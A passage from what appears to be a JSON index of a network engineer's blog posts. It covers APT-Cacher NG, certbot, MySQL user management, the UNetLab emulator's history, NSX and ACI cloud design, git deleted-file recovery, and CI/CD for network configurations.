deb.debian.org/debian-security Remap-elastic: http://artifacts.elastic.co ; https://artifacts.elastic.co Remap-docker: http://download.docker.com ; https://download.docker.com ReportPage: acng-report.html ExThreshold: 4 LocalDirs: acng-doc /usr/share/doc/apt-cacher-ng VfileUseRangeOps: -1 Repositories are accessed via HTTP, and mapped to HTTPS by the APT-Cacher NG daemon, if necessary.\n","cover":"/images/vendors/linux.webp","permalink":"https://www.adainese.it/blog/2020/08/13/apt-proxy-with-apt-cacher-ng/","title":"APT proxy with APT-Cacher NG"},{"categories":["personal-security","security","notes"],"contents":"On my home Linux box, I implemented Let\u0026rsquo;s Encrypt to properly manage secure HTTPs connections. To properly configure it we need to:\nMake the directory /.well-known reachable via HTTP and mapped locally under /var/www/html/.well-known. Register a valid email address: certbot update_account --email andrea.dainese@example.com. Register a new domain: certonly --webroot -w /var/www/html --preferred-challenges http -d www.example.com. Display installed certificates: certbot certificates. Renew expiring certificates: certbot renew. Additional notes:\nIf we are using DDNS domains, the process can fail because a limited number of certificates are allowed for each domain. ","cover":"/images/vendors/letsencrypt.webp","permalink":"https://www.adainese.it/blog/2020/08/07/lets-encrypt-certificates-with-certbot/","title":"Let's Encrypt certificates with certbot"},{"categories":["notes"],"contents":"I\u0026rsquo;m now a DB admin and I always forget how to manage MySQL/MariaDB users. Here are some self-notes to not search over and over the same topic on Google.\nDelete user:\nDROP USER IF EXISTS user; Create user:\nCREATE USER \u0026#39;user\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;pass\u0026#39;; Grant privileges:\nGRANT ALL PRIVILEGES ON database_name.* TO \u0026#39;user\u0026#39;@\u0026#39;localhost\u0026#39;; or\nGRANT ALL PRIVILEGES ON database_name.* TO \u0026#39;user\u0026#39;@\u0026#39;%\u0026#39;; Show User-Specific Grants:\nSELECT Host,User from mysql.user; Show Database-Specific Grants:\nSELECT * FROM mysql.db; Show Table-Specific Grants:\nSELECT * FROM mysql.tables_priv; Show Column-Specific Grants:\nSELECT * FROM mysql.columns_priv; ","cover":"/images/vendors/mariadb.webp","permalink":"https://www.adainese.it/blog/2019/07/09/mysql/mariadb-user-management/","title":"MySQL/MariaDB User Management"},{"categories":["unetlab"],"contents":"I develop network emulators since 2011, and, even if I\u0026rsquo;m not a programmer, I can say I did a good job, putting iou-web (at first) and UNetLab (at last) as a good competitor for GNS3 and VIRL without any budget.\nIf you\u0026rsquo;re looking for EVE-NG please follow the link .\nBelow you can read a summary of my software, and the architecture of the UNetLabv2.\nUNetLabv2 has the same UNetLab features, plus:\nthousands of nodes for each lab; labs distributed between dozens of physical or virtual nodes; unlimited running labs for each user; support for Ansible/NAPALM/\u0026hellip; automation tools Previously on WebIOL/iou-web At the end of 2011, I needed a tool to emulate networks. Prerequisites were:\nportability: labs must be exportable and importable; stability: running labs must be stable, avoiding crashes; performance: labs must be able to run into a cheap laptop or a VM. GNS3 was the only available option, and it couldn\u0026rsquo;t satisfy all prerequisites. I decided to develop a new network emulation software based on IOL (IOS on Linux, by Cisco). I knew many Cisco guys, and I would love to be part of the Cisco family, sooner or later. In the meantime, I realized Cisco developed internally a similar software, called WebIOL.\nWebIOL was developed in Perl and released for Cisco employers only. It contained some basic labs from Cisco 360 program.\nAfter a couple of alpha versions, on January 23rd (2012) iou-web has been released to the public. iou-web (not webiou or web-iou) was developed in PHP and in a few months counted hundreds of users worldwide. If GNS3 supported real IOSes only (via Dynamips), iou-web-supported IOL only. But because IOL was faster than Dynamips, many users preferred iou-web.\nUNL/UNetLab/EVE-NG In 2013 I realized iou-web was too limited, I needed a \u0026ldquo;unified\u0026rdquo; way to emulate a network, including firewalls, load-balancers, and so on. Moreover, multicasting using IOL was bugged. I had more prerequisites:\ninclude vendor virtual appliances in labs; include real IOS in labs; include (possibly) emulators from different vendors; multi-user. I entirely rewrote iou-web to make an extendable network emulator system. The idea was:\neach node (emulated device) must be attached to a common layer; a nice common layer could be an Ethernet Linux bridge (OVS was supported too). On October 6th (2014) UNetLab has been released to the public. Developed in PHP using a REST API framework, and a single page application (jQuery). In a few months, I was able to count five to six hundreds daily users. I would name it UNL, but the website wasn\u0026rsquo;t free.\nInitially, I had the idea to include Huawei eNSP, but because eNSP nodes expect a particular string, no one was able to run eNSP nodes outside eNSP.\nIn 2015 I didn\u0026rsquo;t have enough spare time for UNetLab, so a group of guys forked UNetLab and on January 5th (2017) EVE-NG has been released to the public, but that\u0026rsquo;s another story because I\u0026rsquo;m not part of EVE-NG team.\nIn 2014 I had an interesting chat with a guy from the Cisco VIRL team during CLEUR 2014 (Milan).\nWhy UNetLabv2 In the last two years, my focus moved to network automation, and now I still need a unified network emulator platform but the prerequisites changed. But before that, let me point out UNetLab limits:\nper host pod limit: currently each host can run up to 256 independent pods, because of the console port limit; per lab node limit: currently each pod/lab can run up to 128 - 1 nodes, because of the console port limit; per user pod limit: currently each user can run up to one pod/lab a time, because of the console port limit; one host only: currently there is no way to make a distributed installation of UNetLab (OVS could be used, but many frame types are filtered by default); config management: getting and putting startup-config is done through expect scripts, they are slow, non-predictive, and cannot cover all node types; Dynamips serial interfaces are not supported; no topology change is allowed while lab is running, by design. The console port limit happen because each node console have a fixed console port, calculated as following: ts_port = 32768 + 128 * tenant_id + device_id. Moreover, no more than 512 IOL nodes can run inside the same lab because device_id must be unique for each tenant.\nSo UNetLab v2 must be able to:\nrun a distributed lab (between local or geographically distributed nodes); run lab with a non-limited number of nodes; allow each user to customize a lab without affecting the original copy; link serial interfaces between IOL and Dynamips; configure nodes via Ansible/NAPALM/whatever. I knew how to make a distributed network emulator, but I missed a bit: how to easily run nodes within a dedicated namespace? I got the answer from vrnetlab: using Docker.\nBecause of UNetLab limits, I preferred to rewrite UNetLab from scratch, again. Even if EVE-NG is a UNetLab fork, the EVE-NG team is working to overcome the limits described before.\nUNetLabv2 Architecture The architecture could seem a little bit complex, but that\u0026rsquo;s not true, in fact I was able to implement it by myself and in a relatively short time.\nUNetLabv2 is based on:\nDocker: controller, routers and lab nodes run inside a Docker container; Python: no more C, PHP, or Bash, only Python 3; Python-Flask + NGINX implement and expose APIs; Memcached caches authentication for a better user experience; Celery + Redis manages asynchronous long tasks in the background; MariaDB stores all data/user and running labs; Git stores original labs with version control; jQuery + Bootstrap will implement the UI as a single page app; iptables + Linux bridge allow to connect to just started lab nodes via SSH; IOL, QEMU, and Dynamips run lab nodes. A UNetLabv2 cluster must have at least one node: it could be a physical or a virtual system. Each UNetLabv2 node run Docker: the first UNetLabv2 node is the master one and it contains a controller and a router, every additional UNetLabv2 node contains a router only. Each UNetLabv2 node run also many lab nodes. Controller, routers, and lab nodes are Docker instances.\nThe controller container:\nexposes web UI and APIs to user clients, routers, and lab nodes; receive register requests from routers and lab nodes; provision and manages lab nodes via routers; contact lab nodes via Ansible/NAPALM/\u0026hellip; via routers; provides routing table to routers; can be reached via SSH using port 2222. The router containers:\nregister against the controller; expose Docker Remote API; expose lab node API; get routers and routing table from the controller; route lab packets between nodes and routers; allow reachability between controller and remote lab nodes via OpenVPN. The node containers:\nregister against the controller; run the emulated node (IOL, Dynamips, or QEMU); bind a management interface of emulated notes to a local bridge; route and sNAT/dNAT packets to the management interface of the emulated node; route packets between the local router and the emulated node for the non-management interfaces; manage emulated links (up/down). Because controller and routers know inside and outside IP addresses; users can deploy UNetLabv2 nodes wherever they want (in the same LAN, in AWS, Google Compute Engine, Azure, behind a firewall\u0026hellip;). As the above diagram explains, each UNetLabv2 cluster needs the following ports:\nTCP:2222 to connect to the controller via SSH; TCP:80/443 for HTTP/HTTPS requests to the controller; TCP:5443 for HTTPS requests to the router; UDP:5005 for routed packets between different UNetLabv2 nodes; UDP:1194 for network reachability between the controller and remote lab nodes. UNetLabv2 is discontinued and thus not available to the public. Don\u0026rsquo;t ask for it and go with GNS3 , VIRL or EVE-NG .\nReferences UNetLab archived website Packet Pushers PQ Show 61: The UNetLab Project Approaches and algorithms of virtual telecommunication networks analysis in UNetLab environment (IEEE conference) ","cover":"/blog/2019/01/01/unified-networking-lab-unetlab-the-story/unetlab-1.webp","permalink":"https://www.adainese.it/blog/2019/01/01/unified-networking-lab-unetlab-the-story/","title":"Unified Networking Lab (UNetLab): the story"},{"categories":["automation"],"contents":"A few months ago I prepared a short introduction to automation for a small group of colleagues. Now I would like to summarize in a few posts what I explained to them just to share an overview.\nNowadays automation is one of the coolest words. Vendors are telling us stories about how easy is to automate everything we need.\nBut how is the real world?\nIn the real world, we have the following we have so many ways to automatically interact with devices. I would categorize them as follows:\nZero Touch Provisioning (ZTP): in other words the method to bring a brand new device into a configured state without login to it. Screen Scraping: the set of tools that connect to a terminal line, giving commands and interpreting the output. I included in this category Web Scraping too. NetConf and RESTConf: the \u0026ldquo;standard\u0026rdquo; solutions that will fix everything (maybe). Native Web API: HTTP/HTTPS services available to configure devices. Sometimes APIs are complete, sometimes not. I\u0026rsquo;m including in this category any API that can be consumed via HTTP/HTTPS, like REST, SOAP\u0026hellip; Automation tools like Ansible, Salt Stack, Puppet\u0026hellip; Software Development Kit (SDK): libraries for many programming languages (usually Python and Java). Embedded interpreters (like Python or even Cisco EEM) It\u0026rsquo;s very important to understand the pro, cons, and, above all, limits of each possibility before starting. Because what vendors say, sometimes, does not correspond to reality.\nThose topics were discussed in the 40 hours training I prepared for network engineers. You can find a brief introduction in the link I provide below.\nReferences Automation for Cisco NetDevOps by Andrea Dainese for ipSpace Zero Touch Provisioning by Andrea Dainese for ipSpace Screen and Web scraping by Andrea Dainese for ipSpace NETCONF and RESTCONF by Andrea Dainese for ipSpace Native Web API by Andrea Dainese for ipSpace ","cover":"/images/categories/automation.webp","permalink":"https://www.adainese.it/blog/2018/12/17/a-summary-of-automation-tools-for-cisco-and-non-cisco-devices/","title":"A summary of automation tools for Cisco (and non Cisco) devices"},{"categories":["infrastructure"],"contents":"A few months ago I had a chat with a customer about IAAS. The customer wanted to change its business model from an internal ICT only, to an IAAS style ICT, for both internal and external users.\nThe prerequisites from the customer were:\ninfrastructure distributed into two data centers, 30km between them; able to transparent move workload between the two data centers; users should be able to do everything via a self-service portal. Of course, the above prerequisites are not enough. Customers often don\u0026rsquo;t know what they want. After an additional chat, we agreed on:\nHigh Availability Zones: each data center must be designed to be completely independent. Data centers are interconnected with redundant 100GbE. Mobility: workload could be transparently moved from one data center to the other one. Tenants usually run on one data center only, except when moving. Latency is accepted because that\u0026rsquo;s considered a temporary and planned event. The idea is: that users will get space in a data center, but they can be moved to the other one. Users cannot buy space in both data centers to deliver distributed applications. Physical devices: physical devices can be added to specific tenants. Examples are: ISP routers, Oracle Exadata, IBM AS 400, HSMs\u0026hellip; Connectivity: each tenant can be reached from the external via remote access VPN and site-to-site VPN. Also, external connectivity could be used, like MPLS/VPLS/\u0026hellip; Each tenant can rent some public IP addresses, or just use the assigned ones. Tenants could be interconnected together if they have non-overlapping IP addresses. Storage: fiber-channel storage is not stretched between data centers. Self Service Portal: users won\u0026rsquo;t be able to do \u0026ldquo;everything\u0026rdquo; but only a set of defined actions. Backup and Disaster Recovery: users can buy backup (BaaS) and/or disaster recovery (DRaaS) features on a per VM basis. The very High-Level Design (HLD) The choice of technology should not be discussed at this level, but because every technology has its own prerequisites/features/limitations/peculiarities, we cannot go far without making assumptions.\nThe \u0026ldquo;mobility\u0026rdquo; prerequisite is one of the most stringent: moving workloads without disruption (vMotion), means that LANs must be stretched. To stretch LANs, one of the following can be used:\nstandard VXLAN Cisco ACI VMware NSX This post wants to focus on both VMware NSX and Cisco ACI, so the standard VXLAN will not be discussed. But the step between standard VLAN and Cisco ACI or VMware NSX is short.\nLet\u0026rsquo;s start to design a big picture:\nEach data center is connected to the Internet using one or more ISP, announcing via BGP the same prefixes from the border routers. The border routers are connected to the inside routers and then to a distributed router.\nEach tenant is isolated by a firewall, connected to the distributed router.\nThe diagram is inspired by VMware NSX, so let\u0026rsquo;s start to discuss it in detail.\nVMware NSX Let\u0026rsquo;s see again the diagram:\nEach border router is connected to one or more ISP routers. Both border routers are announcing the same prefixes with the same AS. In other ways, from the Internet, both data centers are seen as single data centers with two independent exits.\nBorder routers will announce also users\u0026rsquo; prefixes directly. Because of NSX limitations (discussed below), BGP peering between tenants and border routers is not permitted.\nBoth border routers are also running OSPF, each one peering with an edge router. An edge router (in the NSX world) is a clustered VM acting as a router with some additional features like NAT, firewall, load balancer, IPSec concentrator\u0026hellip;\nIn this design, both edge routers are just routers, nothing more.\nBoth edge routers are peering (OSPF) with a distributed logical router (DLR). A DLR is a router stretched on one or more physical servers running ESXi. On the other side, the DLR is connected to a stretched network.\nEach tenant has its gateway, implemented by a non-VMware firewall.\nLet\u0026rsquo;s now discuss some VMware NSX limits and the above design choices. Mind that limits can now be changed, so feel free to add your opinion by commenting on this post.\nThe edge routers cannot be automatically moved (vMotion) between data centers: in other words, a workload cannot be moved from DC1 to DC2 without manual intervention. It\u0026rsquo;s still possible to destroy a cluster of edge routers and recreate it in the other DC, using the old configuration, but obviously, this is a disruptive approach. Using non-VMware clustered firewalls allows moving one node at a time. Edge firewalls can also offer remote access VPNs, site-to-site IPSec VPNs\u0026hellip; Because the firewall could be moved to the other data center without changing any IP address, the \u0026ldquo;outside\u0026rdquo; network must be stretched between data centers. The DLR cannot run OSPF facing the firewalls, so static routing is the only option. Each firewall uses the DLR as a default gateway, and the DLR forward packets destined to the public IP address assigned to each tenant. Also, the DLR cannot peer with border routers directly. That\u0026rsquo;s why edge routers are used between DLR and border routers. Because the smaller network that can be announced to Interned is a /24 network, we can assume that more tenants could share the same /24 network. In this case, we should try to run all those tenants in the same DC. The nearest border router will announce a more specific network so all traffic will enter from the right link. Distributed firewall with VMware NSX VMware NSX provides a distributed firewall to implement micro-segmentation. It sounds great, but the distributed firewall policy is one, shared by all tenants. In a multi-tenant environment, having a single policy is not a great idea, because every user has specific needs, and the policy cannot grow forever.\nThe distributed firewall wasn\u0026rsquo;t included in the feature list, but I think that it is still a nice to have feature. How can we adapt a single policy firewall to a multi-tenant environment?\nWe could use tags. Each VM can be tagged and get specific firewall rules.\nAssume for example the following tag:\nserver_HTTP server_HTTP_Proxy client_HTTP_Proxy allow_any We can write a policy like the following:\nVMs tagged with allow_any will receive any traffic. VMs tagged with server_HTTP will receive HTTP connections. VMs tagged with server_HTTP_Proxy will receive connections from client_HTTP_Proxy VMs only. In this scenario, referred to distributed firewall only, not to the edge firewall, each user knows how the policies are, and tagging the VMs can honor or bypass the firewall.\nAvailability zones with VMware NSX Because one of the prerequisites is the independence of data centers, we must design the infrastructure to be alive even if an entire data center is lost.\nPlease remind that users will be able to run VMs only from one data center at a time. Enabling users to run VMs from both data centers is not so difficult, but that\u0026rsquo;s not part of the prerequisites.\nIn the VMware NSX world we have:\nNSX Manager: it\u0026rsquo;s the management plane for the network. Each NSX manager is bound to a single vCenter. NSX Controllers: they are the control plane for the network. Three controllers must exist, two must be alive. If one or no controllers are alive, all VMs \u0026ldquo;should\u0026rdquo; run fine if nothing changes (i.e. no VMotion, no power on\u0026hellip;). vCenter PSC Active Director vCloud Director / vRealize Automation \u0026hellip; Because we need two independent data centers, we need one NSX Manager and three NSX Controller per data center. In this configuration, we must be sure we can move (vMotion) VMs between data centers. In other words, we must be able to move VMs between:\nvCenters (that\u0026rsquo;s fine) vCloud Director / vRealize Automation (probably we cannot do that, the best option we have is a disruptive export and import). Moreover, we have to define virtual networks as universal. In previous vCloud Director and vRealize Automation versions, users cannot create a universal virtual network. The universal virtual network must be manually created by an administrator.\nIf we relax the prerequisite we can have a single stretched infrastructure, with one NSX Manager, three NSX Controllers, and one vCenter. In this case, VMs can be moved without issues but we must consider how to recover from a data center loss of all unique infrastructure VMs (NSX Manager, NSX Controllers, vCenter\u0026hellip;).\nTo be more specific, one data center will run two NSX Controllers, the other one will run just one NSX Controller. If the first data center is lost, the NSX Controllers cluster will lose the quorum. At this time, one NSX Controller must be manually redeployed in the surviving data center.\nBackup and Disaster Recovery Backup VMs and mirroring them into the remote data center is not too difficult. The hardest part is to restore a backup or activate the VM in the remote data center.\nAs I mentioned before, VM could be imported into vCloud Directory / vRealize Automation, but deep tests must be run to check if everything is going fine or not. I\u0026rsquo;m referring especially to tags, networks, service portal accounting\u0026hellip;\nOnboarding Onboarding service is usually omitted from many designs. As an architect, I can say that this is the most critical part for many users: how to migrate a physical and legacy data center to a cloud provider with minimal disruption? I should mention also that many enterprises don\u0026rsquo;t know what is running in their data centers, and often they don\u0026rsquo;t have the skills to plan a move. This can be a business opportunity and an enabler for the IaaS service.\nReferring to VMware, there is a lot of good software like Veeam, Zerto, and so on. All of them have cost, features, and compatibility lists.\nPhysical devices attached to VMware NSX Last but not least, VMware NSX allows extending L2 networks to a physical domain. High availability and convergence timers must be tested to be sure they are compatible with SLA.\nEven if this works fine, it seems to me they are not easy to maintain if the number increases a lot. Moreover, they probably must be manually configured because they are not part of the default vCloud Director / vRealize Automation scripts.\nConclusion for the VMware design I hope you know understand why this design is closely related to technological choice. If running the infrastructure can be more or less vendor-independent, when we add service portal, backup, disaster recovery, and onboarding\u0026hellip; we must evaluate much software and check if and how they can work together.\nAlso, deep customization can be an issue: if we develop scripts for any single action we need to give to users, what can we assure that all scripts will work after a release upgrade?\nCisco ACI Cisco ACI completely split the fabric configuration from the tenant configuration. Once the fabric has been deployed, each tenant can get its contracts, policies, and so on.\nIf VMware has an edge gateway included (not used, however), Cisco ACI has no way to NAT addresses.\nBecause of the VMware NSX (see above) and Cisco ACI limitations, the design is pretty similar:\nWith Cisco ACI border routers can now peer with tenants also, so users can announce their prefixes by themselves.\nThe edge routers are not needed anymore because ACI can peer with external routers directly. With this design, customer can announce their prefixes directly, but the border router must be configured admin transit AS for traffic sourced or destined to the users.\nBecause Cisco ACI cannot NAT IP addresses, a gateway for each tenant is needed. Virtual or physical firewalls can be used, as we discussed before in the VMware NSX paragraph.\nIf the infrastructure is relatively easy to design, the most critical part is once again related to the software: what should we use to virtualize VMs, implement a service portal\u0026hellip;\nOnce again VMware\u0026rsquo;s suite is a good choice, but we can also use OpenStack, OpenNebula, CloudStack\u0026hellip;\nIf a 100% VMware suite can work mostly out of the box, we probably won\u0026rsquo;t see a CloudStack + Cisco ACI service portal ready to be used.\nDistributed firewall with Cisco ACI If the VMware NSX distributed firewall has a single policy, with Cisco ACI each tenant gets its own separated rules.\nAvailability zones with Cisco ACI To fully satisfy the prerequisites, a multi-site fabric must be deployed, with three APIC controllers per site.\nOn the top, a Cisco ACI Multi-Site policy manager can be deployed to manage policies on both data centers from one location only. Of course, the policy manager must be recovered if one site goes completely offline.\nIf we relax the prerequisite we can deploy a multi-pod fabric. Because each fabric must have at least two running controllers (I\u0026rsquo;m not discussing here how a five controller fabric works), once again one data center will get one controller only.\nBut with Cisco ACI, the controller is the management plane. The fabric can work fine even without controllers. And we can add a fourth APIC with the standby role (I guess it\u0026rsquo;s still a manual procedure turning it from standby to active).\nIf only one controller exists, the management can be read-only.\nBackup, Disaster Recovery, and Onboarding We already discussed these topics in the VMware part. More or less with Cisco ACI, all the above considerations are still valid, but because Cisco is not providing a full suite, more development is probably required. That\u0026rsquo;s not necessarily a bad thing.\nPhysical devices attached to Cisco ACI If interconnecting physical devices to a VMware NSX environment is an \u0026ldquo;exception\u0026rdquo; to the virtual world, Cisco ACI is entirely part of the game. In other words, the number of physical devices can increase a lot without any issue.\nConclusion for the Cisco ACI design If VMware offers a more complete suite to cover this design case, Cisco ACI offers a more flexible infrastructure without any additional software.\nBoth solutions have strong limits, and both require to develop much integration.\nConclusions I wrote this post to share ideas and experiences made in the last few years. It cannot be completed and it probably is already outdated. Anyway, it should give you some details on where to start.\nToday there are no out-of-the-box solutions for this case, so more prerequisites should be relaxed. My opinion is that with a 100% virtual world, VMware is maybe the best solution nowadays. But with an important part of physical servers or devices, Cisco ACI is more flexible.\n","cover":"/blog/2018/09/19/designing-a-cloud-provider-with-both-vmware-nsx-and-cisco-aci/multi-dc-2.webp","permalink":"https://www.adainese.it/blog/2018/09/19/designing-a-cloud-provider-with-both-vmware-nsx-and-cisco-aci/","title":"Designing a cloud provider with both VMware NSX and Cisco ACI"},{"categories":["osint","personal-security","notes"],"contents":"Git repositories are very interesting from an OSInt perspective. There are a few commands to find out deleted files and recover them in seconds:\n# Find deleted files git log --diff-filter D --pretty=\u0026#34;format:\u0026#34; --name-only | sed \u0026#39;/^$/d\u0026#39; \u0026gt; deleted_files.txt # Find the associated commit while read line; do git rev-list HEAD -n 1 -- $line | tr \u0026#39;\\n\u0026#39; \u0026#39; \u0026#39;; echo $line; done \u0026lt; deleted_files.txt \u0026gt; deleted_commits.txt # Restore files while read line; do git checkout $(echo $line | cut -d\u0026#34; \u0026#34; -f1)^ $(echo $line | cut -d\u0026#34; \u0026#34; -f2); done \u0026lt; deleted_commits.txt ","cover":"/images/vendors/git.webp","permalink":"https://www.adainese.it/blog/2018/09/19/find-and-recover-deleted-files-on-git-repository/","title":"Find and recover deleted files on Git repository"},{"categories":["automation"],"contents":"A question comes up to my mind few weeks ago: can enterprises operate on networks like they are doing with software today? In other words: can enterprise start to automate things without buying additional solutions?\nShould enterprise buy an out-of-the-box ready-to-use solution? Enterprises usually don\u0026rsquo;t have the time to develop robust tools On the other side commercial tools usually cannot cover all prerequisites the enterprise have. Moreover commercial tools cannot be easily integrated with business processes of the enterprises itself. So enterprises are required to change operations according to the commercial tools. And that\u0026rsquo;s not a good idea.\nIn other words: there is no ready-to-use solution, because you cannot find two different enterprises running the network in the same way. Some solution can be easily adapted to some of your use cases, but no solution can cover all your needs without customizations.\nBe also aware that high customizations usually make difficult to upgrade to latest releases. Be also aware that solutions can be discontinued, both commercial and open source (history has brought us many examples).\nBecause each enterprise is unique, there is no step-by-step procedure to move from a legacy approach to an automated solution. Usually the help of someone who already has been involved in a similar process is priceless.\nHow much it costs to adapt an existing solution or to build a new one? The question is wrong, of course. The right question is: how much can I spare implementing an SDN solution?\nThe term \u0026ldquo;spare\u0026rdquo; is referred to:\nless hours spent operating on the network less hours because of unexpected downtime less hours spent for maintenance (and expected downtime) less hours spent for each task So if the time (and cost) saved is less than the cost of adapting/developing an SDN solution, then you should think about it.\nNetwork as a software: what exactly does it mean? Developers are familiar with a set of tools and methodologies that can be reused by the network guys. Discussing the DevOps philosophy and all related tools in this post is out of the scope, but let me mention some of them:\nCI/CD: the acronyms stand for Continuous Integration/Delivery/Deployment. Continuous Integration is about everyone can merge the code changes multiple times a day, and each merge is automatically tested to assure that the code is working. Continuous Delivery starts after CI and automatically build the software. Continuous Deployment is a step up: the code is automatically deployed in production without any manual step. git is the (client) tool to track changes in files and allows to coordinate people working on the same software. GitLab is a web-based git repository manager with CI/CD features. CI/CD for legacy networks Handling networks as a software means (in short and practice):\nstore network configurations in a git repository; automatically test changes; deploy changes to the production, via a manual trigger or automatically. The first prerequisite is a testing environment. How can we test network changes before send them to the production?\nUsually MMR (Mass Market Retailers) have a complete demo installation for testing purpose, and that\u0026rsquo;s could be a good start. But what about ISP, enterprises, banks and so on?\nThe answer is virtualization: many vendors provide virtual appliances that can be installed into a network emulator solutions like EVE-NG/UNetLab, Cisco VIRL, GNS3. In this post I\u0026rsquo;m using EVE-NG to emulate a network. By the way, many ISPs are already emulating their networks for testing or learning purposes.\nThe second prerequisite require to manage configuration using git. There are many different approaches, but I tried to abstract the network device and focus only on some part of the configurations. Again there is no perfect approach for everyone, so spend a few to design yours.\nWe\u0026rsquo;re supposing:\nan enterprise running Cisco devices only; the physical network is 100% emulated into EVE-NG using equivalent devices; each device name has a postfix (\u0026quot;-test\u0026quot; or \u0026ldquo;-prod\u0026rdquo;) declaring if the device is in production or in test; virtual devices are different (in term of ports and configurations) from the physical devices; we\u0026rsquo;re using the \u0026ldquo;replace config\u0026rdquo; feature, so every time we\u0026rsquo;re pushing the full configuration to the devices. The demo used in this post is very simple: just two routers interconnected with a single cable. Both routers are managed using an out-of-band network.\nThe pipeline Every time a user commits a change:\nThe test lab is built from scratch (EVE-NG exports REST APIs even if they are not documented). The running configs are downloaded from the test devices, then some parts of each config is removed to generate \u0026ldquo;templates\u0026rdquo; for test. New running configs are generated from templates and some variables. New running configs are pushed to all test devices. Some test are run against the test environment to check if everything is working fine. The test lab is destroyed. Changes are now ready for production, manually or automatically. The tools used in the demo Many tools are involved to make it happens:\nEVE-NG: even if APIs are not documented, it\u0026rsquo;s easy to find them using tcpdump (and yes, also because I developed UNetLab). Python 3: because I\u0026rsquo;m using NAPALM, Nornir, Jinja2, Python is mandatory. Also because making API HTTP requests with Python is very easy. Jinja2: used to build running configs starting from templates and YAML files. YAML files: used to store the configuration for all network devices. NAPALM: used to send commands to network devices (also NetMiko can be used if NAPALM is missing a feature) Nornir: used to parallel NAPALM requests. GitLab-EE: store all files and trigger the pipeline on each commit (it\u0026rsquo;s installed into the EVE-NG server). The pipeline in practice Every commit to the repository stored into the GitLab server, triggers some scripts defined into the \u0026ldquo;.gitlab-ci.yml\u0026rdquo; file. This file defines to environment (stage): test and deploy. Each commit starts a local gitlab-runner that run the following pre scripts:\nscripts/destroy_lab.py: using the EVE-NG APIs, it deletes any old stale lab. scripts/prepare_lab.py: using the EVE-NG APIs, it upload the test lab, start it, and wait that all nodes are ready to accept SSH connections. When the lab is up and running, the gitlab-runner run:\nscripts/get_templates_from_test.py: via SSH (Nornir + NAPALM) it downloads all configurations, then remove interface and router sections. The reason is obvious: prod and test environment differs, we need to get unique commands for each devices or the replace config feature won\u0026rsquo;t work. scripts/make_configs_for_test.py: using Jinja2 and YAML files, it builds complete configurations for test devices. scripts/push_to_test.py: via SSH (Nornir + NAPALM) it pushes all configurations to test devices. scripts/test_lab_1.py: via SSH (Nornir + Netmiko) it test that everything is fine. scripts/test_lab_2.py: via SSH (NAPALM) for tasks not working under NAPALM (yet). If the above scripts are OK, than a user can trigger a deploy into production. The after script is always executed to remove the lab after the tests. If something went wrong, the changes cannot go into production.\nIf tests are OK and a user confirm the changes for the production, the following scripts are executed:\nscripts/get_templates_from_prod.py scripts/make_configs_for_prod.py scripts/push_to_prod.py The pipeline should be enhanced so:\nthe commit is reverted back if tests are not going fine (we should introduce merge requests, but it\u0026rsquo;s out of scope); some test are added after the changes are applied to the production and possibly a rollback procedure; store final configs to another git repository (they are not saved in this pipeline). Conclusions Even if it can appear a little bit complicated (and actually it is), this method allow to have lot of things under control:\nevery change is tested; changes can go into production only after test and a manual confirm by a privileged user; every change is tracked; massive changes can be done in minutes. But the real prerequisite is: changing network engineers mindset (and yes, teach them programming).\n","cover":"/blog/2018/09/11/is-sdn-just-a-buzzword-part-2/aci-architecture.webp","permalink":"https://www.adainese.it/blog/2018/09/11/is-sdn-just-a-buzzword-part-2/","title":"Is SDN just a buzzword? (part 2)"},{"categories":["infrastructure"],"contents":"IT infrastructures are evolving fast and they are not becoming simpler. The more flexibility is requested from the application layer, the more complexity is added to the network layer.\nFrom RFC1925:\n(6) It is easier to move a problem around (for example, by moving the problem to a different part of the overall network architecture) than it is to solve it. (6a) (corollary). It is always possible to add another level of indirection.\nComplexity is like entropy: moving a problem around, increases overall complexity. In other words, solving an application problem at the network layer will increase the complexity, referred especially in the operation activities.\nBut what is solved in the network layer rather than in applications? For mainly historical reasons, applications require L2 adjacency, in other words, it\u0026rsquo;s expected that application servers are in the same network. In most cases that is not a strict requirement, but it\u0026rsquo;s a design assumption. Especially legacy applications are implemented \u0026ldquo;to work\u0026rdquo;, not \u0026ldquo;to scale\u0026rdquo;. Because of that, applications are developed as simply as possible, putting one or two clustered application servers in the same network (L2 adjacency), connected to a local database cluster.\nAnd they work, as expected, but\u0026hellip;\nWhat happens when applications must geographically scale between data centers?\nAnd\u0026hellip;\nWhat happens when applications must be secured offline in a different site for disaster recovery purposes?\nOne of the common requirements nowadays is to have applications spanning between Data Centers. So that issues in one Data Center won\u0026rsquo;t decrease the availability. But because application clustering usually expects a local adjacency, local networks must be extended (stretched) between sites. This is requested because initially applications are designed without thinking about geographic availability.\nNow it\u0026rsquo;s obvious that solving an application design issue at the networking layer, will increase the overall complexity.\nHow L2 adjacency can be satisfied by using the network? Many small companies prefer the simple way, without asking if they are doing things right. A couple of cables carry all networks (VLANs) between two sites. This can satisfy the requirements of L2 adjacency without adding any additional complexity. That is the way followed by many small and medium companies: cost-effective, easy to implement, and easy to manage.\nBut a couple of cables trunking all networks does not isolate the two interconnected data centers, so any L2 issue in one site will impact the other site too (packet storm, STP issue\u0026hellip;).\nIn the last years, many technologies have been developed to address these requirements, e.g OTV, FabricPath, VXLAN (and iVXLAN), Geneve\u0026hellip; All of them \u0026ldquo;should\u0026rdquo; give a reasonable availability and isolation. The term \u0026ldquo;should\u0026rdquo; is used because the implementations do not usually follow the correct guidelines and the overall availability is less than expected.\nWe can deduct that maintaining legacy applications and providing them with scalability which is not designed for them, leads to costs.\nBuying equipment to support new technologies Training technical staff Adapting procedures for provisioning and operation Operational time increases because of the overall complexity How to design scalable applications? This would not be an exhaustive post regarding application design, but we should remember that:\nSilos applications should be avoided Databases should be distributed and replicated across sites File servers should be distributed too and should expose files using APIs (hopefully via HTTP), not filesystems (i.e. NFS, SMB/CIFS) Application servers should be stateless L2 adjacency and multicast requirements should be avoided Networks can always fail and this should not have an impact on application performance or availability at all The last point is especially dedicated to all programmers that think that network can never fail. And the result of that assumption always makes applications crash in the event of:\nL2 (STP) or L3 (i.e. BGP) network convergence Firewall or load balancer failover (sometimes upgrades do not preserve sessions) Database failover It\u0026rsquo;s not a secret that famous internet applications (Google, Facebook, LinkedIn, Twitter\u0026hellip;) are designed to geographically scale and they don\u0026rsquo;t need L2 adjacency at all.\nConclusion Even if it does not make sense to me, many companies still prefer to invest money rather than redesign applications to be scalable and distributed. That\u0026rsquo;s OK if it\u0026rsquo;s supported by deep analysis.\nBecause 